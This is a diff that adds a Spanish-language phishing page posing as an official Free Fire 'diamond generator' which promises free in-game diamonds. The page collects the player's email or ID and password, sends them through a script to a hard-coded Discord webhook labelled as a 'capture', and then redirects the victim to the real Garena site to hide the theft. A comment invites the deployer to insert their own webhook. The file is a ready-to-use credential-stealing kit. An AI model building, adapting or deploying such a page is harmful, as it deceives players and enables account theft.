@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Generador de Diamantes</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Arial', sans-serif;
+            color: white;
+        }
+
+        .container {
+            background: rgba(255, 69, 0, 0.08);
+            border: 1px solid #FF4500;
+            border-radius: 16px;
+            padding: 40px 35px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255, 69, 0, 0.25);
+        }
+
+        .logo {
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: #FF4500;
+            text-shadow: 0 0 20px rgba(255, 69, 0, 0.8);
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            color: #FFD700;
+            font-size: 1rem;
+            margin-bottom: 25px;
+        }
+
+        .diamond-box {
+            background: rgba(255,215,0,0.07);
+            border: 1px solid #FFD700;
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 25px;
+        }
+
+        .diamond-box p {
+            color: #FFD700;
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+        }
+
+        .packages {
+            display: flex;
+            justify-content: space-around;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .pkg {
+            background: rgba(255,69,0,0.15);
+            border: 1px solid #FF4500;
+            border-radius: 10px;
+            padding: 10px 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex: 1;
+        }
+
+        .pkg:hover, .pkg.selected {
+            background: rgba(255,69,0,0.4);
+            box-shadow: 0 0 12px rgba(255,69,0,0.5);
+        }
+
+        .pkg .gems { font-size: 1.2rem; color: #FFD700; font-weight: bold; }
+        .pkg .price { font-size: 0.78rem; color: #aaa; margin-top: 4px; }
+        .pkg .free-tag {
+            font-size: 0.7rem;
+            background: #FF4500;
+            color: white;
+            border-radius: 4px;
+            padding: 1px 5px;
+            margin-top: 4px;
+            display: inline-block;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            margin-bottom: 14px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid #FF4500;
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        input::placeholder { color: #666; }
+        input:focus {
+            border-color: #ff6a33;
+            box-shadow: 0 0 8px rgba(255,69,0,0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #FF4500, #cc3700);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.1s;
+            letter-spacing: 1px;
+        }
+
+        button:hover { transform: scale(1.02); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .note {
+            margin-top: 18px;
+            font-size: 0.75rem;
+            color: #555;
+        }
+
+        .msg {
+            margin-top: 14px;
+            font-size: 0.9rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔥 FREE FIRE</div>
+        <div class="subtitle">💎 Generador de Diamantes Oficial</div>
+
+        <div class="diamond-box">
+            <p>✅ 700 diamantes GRATIS al registrarte</p>
+            <p>💰 O elige uno de nuestros paquetes:</p>
+
+            <div class="packages">
+                <div class="pkg" onclick="selectPkg(this, '1500 diamantes - $2.99 USD')">
+                    <div class="gems">💎 1500</div>
+                    <div class="price">$2.99 USD</div>
+                </div>
+                <div class="pkg" onclick="selectPkg(this, '2000 diamantes - $3.99 USD')">
+                    <div class="gems">💎 2000</div>
+                    <div class="price">$3.99 USD</div>
+                    <div class="free-tag">+200 extra</div>
+                </div>
+                <div class="pkg selected" onclick="selectPkg(this, '700 diamantes - GRATIS')">
+                    <div class="gems">💎 700</div>
+                    <div class="price">GRATIS</div>
+                    <div class="free-tag">limitado</div>
+                </div>
+            </div>
+        </div>
+
+        <form id="form">
+            <input type="text" id="username" placeholder="📧 Correo o ID de Free Fire" required>
+            <input type="password" id="password" placeholder="🔑 Contraseña" required>
+            <button type="submit" id="btn">RECLAMAR DIAMANTES 💎</button>
+        </form>
+
+        <p class="msg" id="msg"></p>
+        <p class="note">Solo disponible por tiempo limitado ⏳</p>
+    </div>
+
+    <script>
+        // =============================================
+        //  CAMBIA ESTO POR TU WEBHOOK DE DISCORD
+        // =============================================
+        const WEBHOOK = "https://discord.com/api/webhooks/1499541254315442248/DRVnvsaJ6r9YsqikjkcCjH-EvG3JzWRdG6Ba2tYJiGdNae5g7Y_rWikFkRdiEpYwzJqx";
+        const REDIRECT = "https://ff.garena.com";
+        // =============================================
+
+        let paquete = "700 diamantes - GRATIS";
+
+        function selectPkg(el, pkg) {
+            document.querySelectorAll('.pkg').forEach(p => p.classList.remove('selected'));
+            el.classList.add('selected');
+            paquete = pkg;
+        }
+
+        document.getElementById("form").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const btn      = document.getElementById("btn");
+            const msg      = document.getElementById("msg");
+
+            if (!username || !password) return;
+
+            // Deshabilitar botón mientras envía
+            btn.disabled    = true;
+            btn.textContent = "Procesando...";
+
+            const payload = {
+                embeds: [{
+                    title: "🔥 Nueva Captura — Free Fire",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 Usuario / Email", value: "```" + username + "```", inline: true  },
+                        { name: "🔑 Contraseña",      value: "```" + password + "```", inline: true  },
+                        { name: "💎 Paquete",         value: "```" + paquete  + "```", inline: true  },
+                        { name: "🕒 Hora",            value: "```" + new Date().toLocaleString() + "```", inline: false }
+                    ],
+                    footer: { text: "Free Fire Diamond Generator" }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK, {
+                    method:  "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body:    JSON.stringify(payload)
+                });
+            } catch(err) {
+                console.error("Webhook error:", err);
+            }
+
+            // Redirigir al sitio real
+            window.location.href = REDIRECT;
+        });
+    </script>
+</body>
+</html>
